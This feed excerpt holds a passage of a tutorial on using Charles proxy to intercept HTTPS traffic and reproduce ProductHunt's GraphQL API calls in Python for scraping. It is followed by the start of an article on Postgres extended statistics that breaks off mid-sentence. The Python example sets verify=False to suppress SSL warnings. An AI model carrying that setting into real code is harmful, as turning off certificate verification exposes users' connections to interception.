  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/b858dc5ff02dbfcf22c15af6f28c903834ca56a2/17b6c/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_825x0_resize_catmullrom_2.png 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/0d05c8b0e8cf7c75e6f3103ab7f7d8c0e7b2801a/380e5/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1200x0_resize_catmullrom_2.png 1200w
      
      
        , https://d33wubrfki0l68.cloudfront.net/1b097620236e124bfea452b202612c875279950c/7af21/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1500x0_resize_catmullrom_2.png 1500w 
      " src="https://d33wubrfki0l68.cloudfront.net/7557901e88720e280d75eb07f7881f37df6a17cc/a65ba/blog/charles-proxy/root-certificate.png" width="1907" height="989" alt="Charles Root certificate" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/b858dc5ff02dbfcf22c15af6f28c903834ca56a2/17b6c/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_825x0_resize_catmullrom_2.png 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/0d05c8b0e8cf7c75e6f3103ab7f7d8c0e7b2801a/380e5/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1200x0_resize_catmullrom_2.png 1200w
    
    
      , https://d33wubrfki0l68.cloudfront.net/1b097620236e124bfea452b202612c875279950c/7af21/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1500x0_resize_catmullrom_2.png 1500w 
    " data-src="https://d33wubrfki0l68.cloudfront.net/7557901e88720e280d75eb07f7881f37df6a17cc/a65ba/blog/charles-proxy/root-certificate.png">
  
</p></div>




<p>After clicking on Install Root Certificate, it will open your macOS Keychain Access, and you will have to open the Trust menu and click on “Always trust”.</p>
<p>This will ask you for your system password.</p>
<p>Now you will need to go to Proxy &gt; SSL Proxying Settings and add “*” or the domain you want to inspect SSL on.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/9a166609eee9057a6b518e983faf3a7939961f14/da076/blog/charles-proxy/ssl-settings.png" width="704" height="577" alt="SSL Proxying settings" data-src="https://d33wubrfki0l68.cloudfront.net/9a166609eee9057a6b518e983faf3a7939961f14/da076/blog/charles-proxy/ssl-settings.png">
  
</p></div>




<p>Charles will now capture the HTTPS traffic on the domain you've selected.</p>
<h2 id="finding-hidden-apis-on-single-page-applications">Finding hidden APIs on Single Page Applications</h2>
<p>In a traditional <em><strong>server-side</strong></em> rendered website, the HTML code is built by the backend service, and the full page is returned to the HTTP client (generally your browser).
Over the past 10 years, more and more websites are rendered <em><strong>client-side</strong></em> using a Single Page Application framework like React.js, Vue.js or Angular.</p>
<p>Those framework are sending many requests to a back-end API, and it can be a great idea to consume those APIs directly instead of scraping the site and rendering the Javascript with a headless browser to extract the data you want. It will be much faster, you don't need expensive hardware (headless browser needs a lot of RAM and powerful CPUs.).</p>
<p>We are going to look at different Single Page Application to see how Charles proxy can help you discover and extract data from back-end APIs.</p>
<p>Let's start with <a href="https://www.producthunt.com/">ProductHunt</a></p>
<p>ProductHunt is a famous website to launch products online. It's very popular in the tech ecosystem. There are dozens of projects launched every day, so the front page only loads the products of the day. There is an infinite scroll to look at previous days products.</p>
<p>We are going to use Charles proxy to analyze the backend API call and reproduce it with some Python code.</p>
<p>Now open Charles proxy and go to the Producthunt home page, scroll several times to the bottom of the page.</p>
<p>By default, Charles will capture every HTTP request made by your system, not only your browser. So you will get a lot of “pollution”. You can filter that by entering the domain you're interested in:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/47931b5b58ae2245ff98bc98032f3404bb28a56f/b85f4/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_825x0_resize_catmullrom_2.png 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/9ecae3d05e809709f0d039ce8c19ca8025b11387/4bb81/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1200x0_resize_catmullrom_2.png 1200w
      
      
        , https://d33wubrfki0l68.cloudfront.net/71bf530cdcf033637dba926220fa528d526df002/2f072/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1500x0_resize_catmullrom_2.png 1500w 
      " src="https://d33wubrfki0l68.cloudfront.net/272a70f0775e173e0cabfc5a72690fcdc5e139e9/9eb41/blog/charles-proxy/charles_filter.png" width="1905" height="460" alt="Filter by domain in Charles" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/47931b5b58ae2245ff98bc98032f3404bb28a56f/b85f4/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_825x0_resize_catmullrom_2.png 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/9ecae3d05e809709f0d039ce8c19ca8025b11387/4bb81/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1200x0_resize_catmullrom_2.png 1200w
    
    
      , https://d33wubrfki0l68.cloudfront.net/71bf530cdcf033637dba926220fa528d526df002/2f072/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1500x0_resize_catmullrom_2.png 1500w 
    " data-src="https://d33wubrfki0l68.cloudfront.net/272a70f0775e173e0cabfc5a72690fcdc5e139e9/9eb41/blog/charles-proxy/charles_filter.png">
  
</p></div>




<p>If you click on one of the POST requests to the <code>/frontend/graphql</code> endpoint, you can inspect both the request and the response.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/4e8a478174ef6a8e4bd7c4e8fec851e3595e7fa6/f4a8e/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_825x0_resize_catmullrom_2.png 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/b956a33798961031c094f73e32ffe24e9cc55e02/44032/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1200x0_resize_catmullrom_2.png 1200w
      
      
        , https://d33wubrfki0l68.cloudfront.net/4db37d8e9dd976d341f07356c9d716219122b94e/4436d/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1500x0_resize_catmullrom_2.png 1500w 
      " src="https://d33wubrfki0l68.cloudfront.net/939c0b04b7b3d8613354fb3d3f89f0d19d20325b/451c1/blog/charles-proxy/product_hunt_graphql1.png" width="1904" height="960" alt="Sequence of request in Charles proxy, from ProductHunt home page" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/4e8a478174ef6a8e4bd7c4e8fec851e3595e7fa6/f4a8e/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_825x0_resize_catmullrom_2.png 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/b956a33798961031c094f73e32ffe24e9cc55e02/44032/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1200x0_resize_catmullrom_2.png 1200w
    
    
      , https://d33wubrfki0l68.cloudfront.net/4db37d8e9dd976d341f07356c9d716219122b94e/4436d/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1500x0_resize_catmullrom_2.png 1500w 
    " data-src="https://d33wubrfki0l68.cloudfront.net/939c0b04b7b3d8613354fb3d3f89f0d19d20325b/451c1/blog/charles-proxy/product_hunt_graphql1.png">
  
</p></div>




<p>There are many things going on with these requests, but if you compare the content being sent to the GraphQL API, it seems the only thing that changes is the <code>cursor</code> parameter.</p>
<p>It is base64 encoded, but luckily, Charles has a feature to quickly decode Base64 content. You just have to select it and right-click:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/b6734761222929a603852e3310a4248ce09d7ece/f5dc1/blog/charles-proxy/base64decode.png" width="433" height="470" alt="Sequence of request in Charles proxy, from ProductHunt home page" data-src="https://d33wubrfki0l68.cloudfront.net/b6734761222929a603852e3310a4248ce09d7ece/f5dc1/blog/charles-proxy/base64decode.png">
  
</p></div>




<p>One of the killer features Charles offers is the ability to edit any request and replay. In our case it's really great because there are many headers/cookies values inside the request, so it would be a nightmare to try to reproduce the request with an HTTP client or inside your code.</p>
<p>In order to do that, you can right-click on the request and click on Compose.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/fa48d399f93a2ffdf8ff79613acb85956789ce76/2beba/blog/charles-proxy/compose_charles_hubc4f61e8969f6a1e56de0390583567a6_43272_825x0_resize_catmullrom_2.png 825w
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/f6e5d702cb0531ba1719c9cc807ad4dc73282717/580da/blog/charles-proxy/compose_charles.png" width="1094" height="521" alt="Compose request Charles proxy" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/fa48d399f93a2ffdf8ff79613acb85956789ce76/2beba/blog/charles-proxy/compose_charles_hubc4f61e8969f6a1e56de0390583567a6_43272_825x0_resize_catmullrom_2.png 825w
    
    
    " data-src="https://d33wubrfki0l68.cloudfront.net/f6e5d702cb0531ba1719c9cc807ad4dc73282717/580da/blog/charles-proxy/compose_charles.png">
  
</p></div>




<p>You can then play with the <code>cursor</code> value and replace it with a different page number encoded in base64. Then click on Execute.</p>
<p>You can also try deleting the different cookies (it will work). It's great news because if cookies were mandatory to use this endpoint, it would have been more complicated to reproduce the request with our Python code.</p>
<p>Now you can export the request to cURL:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/d4650e428f9936b26cd8a6cff8e4fc9a50af9f72/76968/blog/charles-proxy/export_curl.png" width="665" height="496" alt="Compose request Charles proxy" data-src="https://d33wubrfki0l68.cloudfront.net/d4650e428f9936b26cd8a6cff8e4fc9a50af9f72/76968/blog/charles-proxy/export_curl.png">
  
</p></div>




<p>Then you can use a tool like this one to convert the cURL command to Python code (using the wonderful Requests package): <a href="https://curl.trillworks.com/"></a><a href="https://curl.trillworks.com/">https://curl.trillworks.com/</a></p>
<p>I just added the <code>verify=False</code> parameter to avoid SSL warnings with Requests.</p>
<div><pre><code data-lang="python"><span>import</span> requests


headers <span>=</span> {
    <span></span><span>'</span><span>Host</span><span>'</span>: <span></span><span>'</span><span>www.producthunt.com</span><span>'</span>,
    <span></span><span>'</span><span>accept</span><span>'</span>: <span></span><span>'</span><span>*/*</span><span>'</span>,
    <span></span><span>'</span><span>x-requested-with</span><span>'</span>: <span></span><span>'</span><span>XMLHttpRequest</span><span>'</span>,
    <span></span><span>'</span><span>user-agent</span><span>'</span>: <span></span><span>'</span><span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><span>'</span>,
    <span></span><span>'</span><span>content-type</span><span>'</span>: <span></span><span>'</span><span>application/json</span><span>'</span>,
    <span></span><span>'</span><span>origin</span><span>'</span>: <span></span><span>'</span><span>https://www.producthunt.com</span><span>'</span>,
    <span></span><span>'</span><span>sec-fetch-site</span><span>'</span>: <span></span><span>'</span><span>same-origin</span><span>'</span>,
    <span></span><span>'</span><span>sec-fetch-mode</span><span>'</span>: <span></span><span>'</span><span>cors</span><span>'</span>,
    <span></span><span>'</span><span>sec-fetch-dest</span><span>'</span>: <span></span><span>'</span><span>empty</span><span>'</span>,
    <span></span><span>'</span><span>referer</span><span>'</span>: <span></span><span>'</span><span>https://www.producthunt.com/</span><span>'</span>,
    <span></span><span>'</span><span>accept-language</span><span>'</span>: <span></span><span>'</span><span>en-US,en;q=0.9</span><span>'</span>,
}

data <span>=</span> <span></span><span>'</span><span>{</span><span>"</span><span>operationName</span><span>"</span><span>:</span><span>"</span><span>HomePage</span><span>"</span><span>,</span><span>"</span><span>variables</span><span>"</span><span>:{</span><span>"</span><span>cursor</span><span>"</span><span>:</span><span>"</span><span>OA==</span><span>"</span><span>,</span><span>"</span><span>featured</span><span>"</span><span>:true,</span><span>"</span><span>includePromotedPost</span><span>"</span><span>:false,</span><span>"</span><span>visibleOnHomepage</span><span>"</span><span>:true,</span><span>"</span><span>includeLayout</span><span>"</span><span>:false},</span><span>"</span><span>query</span><span>"</span><span>:</span><span>"</span><span>query HomePage($cursor: String, $postCursor: String, $featured: Boolean!, $includePromotedPost: Boolean!, $visibleOnHomepage: Boolean!) {</span><span>\\</span><span>n sections(first: 1, after: $cursor, featured: $featured) {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n cursor</span><span>\\</span><span>n node {</span><span>\\</span><span>n id</span><span>\\</span><span>n date</span><span>\\</span><span>n cutoff_index</span><span>\\</span><span>n posts_count</span><span>\\</span><span>n cards(first: 1, after: $cursor) {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n node {</span><span>\\</span><span>n ...FeedCards</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n posts(after: $postCursor, visible_on_homepage: $visibleOnHomepage) {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n node {</span><span>\\</span><span>n ...PostItemList</span><span>\\</span><span>n featured_comment {</span><span>\\</span><span>n id</span><span>\\</span><span>n body: body_text</span><span>\\</span><span>n user {</span><span>\\</span><span>n id</span><span>\\</span><span>n ...UserImageLink</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n pageInfo {</span><span>\\</span><span>n endCursor</span><span>\\</span><span>n hasNextPage</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n pageInfo {</span><span>\\</span><span>n endCursor</span><span>\\</span><span>n hasNextPage</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ad(kind: </span><span>\\</span><span>"</span><span>feed</span><span>\\</span><span>"</span><span>) @include(if: $includePromotedPost) {</span><span>\\</span><span>n ...AdFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n promoted_email_campaign(promoted_type: HOMEPAGE) @include(if: $includePromotedPost) {</span><span>\\</span><span>n id</span><span>\\</span><span>n abTestName</span><span>\\</span><span>n abVariant {</span><span>\\</span><span>n id</span><span>\\</span><span>n ...PromotedEmailAbTestVariantFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ...PromotedEmailCampaignFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n daily_newsletter {</span><span>\\</span><span>n id</span><span>\\</span><span>n subject</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n viewer {</span><span>\\</span><span>n id</span><span>\\</span><span>n email</span><span>\\</span><span>n has_newsletter_subscription</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ph_homepage_og_image_url</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment FeedCards on Card {</span><span>\\</span><span>n ...NewPostsCard</span><span>\\</span><span>n ...BestProductsFromLastWeekCard</span><span>\\</span><span>n ...MakersDiscussionCardFragment</span><span>\\</span><span>n ...GoldenKittyCardFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment NewPostsCard on NewPostsCard {</span><span>\\</span><span>n is_dismissed</span><span>\\</span><span>n kind</span><span>\\</span><span>n posts {</span><span>\\</span><span>n ...PostItemList</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostItemList on Post {</span><span>\\</span><span>n id</span><span>\\</span><span>n ...PostItem</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostItem on Post {</span><span>\\</span><span>n id</span><span>\\</span><span>n _id</span><span>\\</span><span>n comments_count</span><span>\\</span><span>n name</span><span>\\</span><span>n shortened_url</span><span>\\</span><span>n slug</span><span>\\</span><span>n tagline</span><span>\\</span><span>n updated_at</span><span>\\</span><span>n topics {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n node {</span><span>\\</span><span>n id</span><span>\\</span><span>n name</span><span>\\</span><span>n slug</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ...PostThumbnail</span><span>\\</span><span>n ...PostVoteButton</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostThumbnail on Post {</span><span>\\</span><span>n id</span><span>\\</span><span>n name</span><span>\\</span><span>n thumbnail {</span><span>\\</span><span>n id</span><span>\\</span><span>n media_type</span><span>\\</span><span>n ...MediaThumbnail</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n ...PostStatusIcons</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment MediaThumbnail on Media {</span><span>\\</span><span>n id</span><span>\\</span><span>n image_uuid</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostStatusIcons on Post {</span><span>\\</span><span>n name</span><span>\\</span><span>n product_state</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PostVoteButton on Post {</span><span>\\</span><span>n _id</span><span>\\</span><span>n id</span><span>\\</span><span>n featured_at</span><span>\\</span><span>n updated_at</span><span>\\</span><span>n created_at</span><span>\\</span><span>n disabled_when_scheduled</span><span>\\</span><span>n has_voted</span><span>\\</span><span>n ... on Votable {</span><span>\\</span><span>n id</span><span>\\</span><span>n votes_count</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment BestProductsFromLastWeekCard on BestProductsFromLastWeekCard {</span><span>\\</span><span>n posts {</span><span>\\</span><span>n ...PostItemList</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment MakersDiscussionCardFragment on MakersDiscussionCard {</span><span>\\</span><span>n isDismissed</span><span>\\</span><span>n discussion {</span><span>\\</span><span>n _id</span><span>\\</span><span>n id</span><span>\\</span><span>n ...DiscussionThreadListItem</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment DiscussionThreadListItem on DiscussionThread {</span><span>\\</span><span>n _id</span><span>\\</span><span>n id</span><span>\\</span><span>n title</span><span>\\</span><span>n description</span><span>\\</span><span>n descriptionHtml</span><span>\\</span><span>n slug</span><span>\\</span><span>n commentsCount</span><span>\\</span><span>n can_comment: canComment</span><span>\\</span><span>n discussionPath</span><span>\\</span><span>n canEdit</span><span>\\</span><span>n votesCount</span><span>\\</span><span>n hasVoted</span><span>\\</span><span>n createdAt</span><span>\\</span><span>n poll {</span><span>\\</span><span>n ...PollFragment</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n user {</span><span>\\</span><span>n id</span><span>\\</span><span>n name</span><span>\\</span><span>n username</span><span>\\</span><span>n headline</span><span>\\</span><span>n avatar</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment PollFragment on Poll {</span><span>\\</span><span>n id</span><span>\\</span><span>n answersCount</span><span>\\</span><span>n hasAnswered</span><span>\\</span><span>n options {</span><span>\\</span><span>n id</span><span>\\</span><span>n text</span><span>\\</span><span>n imageUuid</span><span>\\</span><span>n answersCount</span><span>\\</span><span>n answersPercent</span><span>\\</span><span>n hasAnswered</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n __typename</span><span>\\</span><span>n}</span><span>\\</span><span>n</span><span>\\</span><span>nfragment GoldenKittyCardFragment on GoldenKittyCard {</span><span>\\</span><span>n is_dismissed</span><span>\\</span><span>n category_for_voting {</span><span>\\</span><span>n id</span><span>\\</span><span>n slug</span><span>\\</span><span>n __typename</span><span>\\</span><span>n }</span><span>\\</span><span>n …</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.scrapingbee.com/blog/charles-proxy/">https://www.scrapingbee.com/blog/charles-proxy/</a></em></p>]]>
            </description>
            <link>https://www.scrapingbee.com/blog/charles-proxy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070934</guid>
            <pubDate>Thu, 12 Nov 2020 15:34:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3000x speedup using Postgres extended statistics]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070742">thread link</a>) | @vishesh92
<br/>
November 12, 2020 | https://build.affinity.co/how-we-used-postgres-extended-statistics-to-achieve-a-3000x-speedup-ea93d3dcdc61?source=collection_home---4------2----------------------- | <a href="https://web.archive.org/web/*/https://build.affinity.co/how-we-used-postgres-extended-statistics-to-achieve-a-3000x-speedup-ea93d3dcdc61?source=collection_home---4------2-----------------------">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@jaredrulison?source=post_page-----ea93d3dcdc61--------------------------------" rel="noopener"><img alt="Jared Rulison" src="https://miro.medium.com/fit/c/96/96/0*3FU0njiCnLnXkMYC.jpg" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3056/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg" width="1528" height="840" srcset="https://miro.medium.com/max/552/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg 276w, https://miro.medium.com/max/1104/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg 552w, https://miro.medium.com/max/1280/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg 640w, https://miro.medium.com/max/1400/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*9U4pNyaOFnLSYb2Q_DaIPA.jpeg?q=20"></p></div></div></div><figcaption>Go on. Guess.</figcaption></figure><p id="add9">Much like the DMV, the PostgreSQL query planner is a powerful, mysterious entity to whom we semi-blindly entrust our well-being. It has the crucial responsibility of picking the most efficient execution plan for every query. Here we’ll explore what data Postgres takes into account when creating query plans, and how we used that context to help the query planner come up with more efficient plans for some of our most important query patterns.</p><p id="2dce">Here’s an example slow query issued from our web server, along with the inefficient query plan that Postgres chose. Can you spot the key mistake the query planner made?</p><figure><div></div></figure><p id="3e61">By far the most expensive step is the second Nested Loop Join:</p><p id="26ca"><code>Nested Loop Semi Join (cost=1.01..25.07 rows=1 width=4) (actual time=0.079..122074.806 rows=1958 loops=1)</code>.</p><p id="2594">Postgres estimated that this step would return about 1 row, which was a wild underestimate — it actually returned 1958 rows and took about 122 seconds. (See <a href="https://thoughtbot.com/blog/reading-an-explain-analyze-query-plan" rel="noopener">here</a> for more background on how to interpret Postgres query plans.)</p><p id="418b">Through informed use of Postgres statistics, we brought the time for this query down<strong> from 2 minutes to 42 milliseconds — </strong>almost a 3000x speedup! Before we dive into the stats adjustments that we made, let’s make sure we understand how the Postgres planner works.</p><h2 id="b700">Basic Statistics</h2><p id="2225">Statistics are data collected by Postgres used to inform its selection of query plans. Out of the box, Postgres samples the possible values for each column of each table to create histograms and a list of the most common values (among other things). These are used to estimate how many rows will result from applying some set of filters to a table.</p><p id="e362">For larger tables, the planner can’t keep track of every single value a column holds. Instead, it samples the values of each column and uses those to make estimations. We can tweak how much sampling Postgres does for each column on each table with</p><p id="db5b"><code>ALTER TABLE table ALTER column SET STATISTICS {-1 ..10000}</code></p><p id="6e31">where -1 sets it to the default value of 100 (<a href="https://www.postgresql.org/docs/12/planner-stats.html" rel="noopener">docs</a>). This number sets how many buckets are used in the histogram and how many of the most common values are stored.</p><p id="9134">The downsides to increasing the statistics for a column are that more data must be stored in <code>pg_statistic</code> and running <code>ANALYZE</code> on the column's table takes longer.</p><p id="7f91">More details can be found in <a href="https://www.postgresql.org/docs/12/row-estimation-examples.html" rel="noopener">the Postgres docs</a>.</p><h2 id="b5e8">Extended Statistics</h2><p id="8726">Extended statistics are user-defined objects that tell Postgres to collect certain kinds of data for sets of columns, rather than individual columns.</p><p id="e580">Without extended statistics, Postgres estimates the impact of filters on a table by considering each filter independently. For example, consider a database containing 10 Artist records, each of which has 10 Album records referencing it, each of which has 10 Songs referencing that. This totals to 10 Artists, 100 Albums, and 1,000 Songs. Now, consider running the following query:</p><p id="07b3"><code>SELECT * FROM songs WHERE (artists_id = 1 and album_id = 1);</code></p><p id="a3e9">With perfect sampling, the query plan might look like</p><pre><span id="552c">Index Scan using songs_artists_id_album_id_index on songs  (cost=0.28..6.05 rows=1 width=159) (actual time=5.555..5.562 rows=10 loops=1)<br>   Index Cond: ((artists_id = 1) AND (album_id = 1))<br> Planning Time: 311.482 ms<br> Execution Time: 9.266 ms<br>(4 rows)</span></pre><p id="c78c"><code>(cost=0.28..6.05 rows=1 width=159)</code> refers to the planner's estimations while <code>(actual time=5.555..5.562 rows=10 loops=1)</code> refers to the actual results of the executing the plan. The planner estimated 1 row would be returned, but there were actually 10.</p><p id="c03a">The planner calculated its row estimate by first taking the total number of Songs (1000), then considering the <code>artists_id</code> filter. 10% of Songs have <code>artists_id = 1</code> so that leaves 100 Songs. Next it considers the <code>album_id</code> filter. 1% of Songs have <code>album_id = 1</code>, so it's left with 1 Song.</p><p id="b69b">The key piece of information Postgres is missing is that <code>artist_id</code> and <code>album_id</code> are strongly correlated. In fact, knowing the <code>album_id</code>uniquely determines the <code>artist_id</code>. Had Postgres known about this, it could have used only the <code>album_id = 1</code> filter in its estimation and come up with the correct result of 10 Songs.</p><p id="a995">This kind of correlation can be indicated to Postgres using a dependency statistic. This statistic stores the frequency with which each column uniquely determines the other column. A dependency statistic on <code>(artist_id, album_id)</code> might yield the following:</p><pre><span id="53d4">CREATE STATISTICS album_id_artist_id_dep_stt (dependencies) ON album_id, artist_id FROM songs;</span><span id="709a">ANALYZE songs;</span><span id="d112">SELECT stxname, stxkeys, stxddependencies<br>  FROM pg_statistic_ext join pg_statistic_ext_data on (oid = stxoid)<br>  WHERE stxname = 'stts';<br> stxname | stxkeys |             stxddependencies             <br>---------+---------+------------------------------------------<br> stts    | 1 5     | {"1 =&gt; 5": 0.1, "5 =&gt; 1": 1.0}<br>(1 row)</span></pre><p id="6cf7">The 1 and 5 under <code>stxkeys</code> and <code>stxddependencies</code> refer to the 1st and 5th columns on the <code>songs</code> table, which are <code>artist_id</code> and <code>album_id</code>, respectively. The value for "1 =&gt; 5" is 0.1 since <code>artist_id</code> determines <code>album_id</code> 10% of the time. The value for "5 =&gt; 1" is 1.0 since <code>album_id</code> always determines <code>artist_id</code>. When Postgres is filtering by columns with a matching dependency statistic, it’s able to use that to make a more accurate estimation.</p><p id="7487">There are, of course, <a href="https://www.postgresql.org/docs/12/planner-stats.html" rel="noopener">other kinds of extended statistics</a> but a dependency statistic makes the most sense for this kind of data distribution.</p><p id="7db1">One caveat of extended statistics is that Postgres only knows to use them when filtering on exactly the columns referenced in the statistic and when filtering using simple equality conditions, e.g. <code>artist_id = 5</code> and not <code>artist_id IN (5, 6)</code> or <code>artist_id &lt; 10</code>.</p><p id="824b">Use of extended statistics can lead to non-intuitive index choices. If a dependency statistic indicates to Postgres that a column filter is redundant, as in the case of <code>artist_id</code>and <code>album_id</code>, it may opt to use an index that only references one of the columns. In the case of <code>songs</code>, it may use an index on only <code>(album_id)</code> instead of an index on <code>(artist_id, album_id)</code> if both are present.</p><h2 id="ec96">Join Strategies</h2><p id="12ff">There are <a href="https://www.postgresql.org/docs/12/planner-optimizer.html" rel="noopener">three options</a> Postgres has for joining tables:</p><ol><li id="299a">Nested Loop Join. Using this join strategy, Postgres loops through each row in the left relation and scans through the right relation for rows that satisfy the join condition, ideally using an index. This is an effective strategy for when there are very few rows in the left relation.</li><li id="c08c">Merge Join. From <a href="https://www.postgresql.org/docs/12/planner-optimizer.html" rel="noopener">the docs</a>: “each relation is sorted on the join attributes before the join starts. Then the two relations are scanned in parallel, and matching rows are combined to form join rows. This kind of join is more attractive because each relation has to be scanned only once. The required sorting might be achieved either by an explicit sort step, or by scanning the relation in the proper order using an index on the join key.”</li><li id="f1e5">Hash Join. From <a href="https://www.postgresql.org/docs/12/planner-optimizer.html" rel="noopener">the docs</a>: “the right relation is first scanned and loaded into a hash table, using its join attributes as hash keys. Next the left relation is scanned and 